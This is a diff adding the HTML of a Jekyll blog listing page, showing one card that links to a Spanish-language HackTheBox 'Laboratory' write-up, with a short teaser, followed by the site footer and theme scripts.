+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/laboratory">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/laboratory/298banner.png" alt="HackTheBox - Laboratory"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/laboratory">HackTheBox - Laboratory</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil. Tendremos al lobo naranja (GitLab) :P como punto de entrada, jugaremos con Backups y archivos .bundle, obtendremos las llaves de la casa y nos haremos dueños...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">15 Apr 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
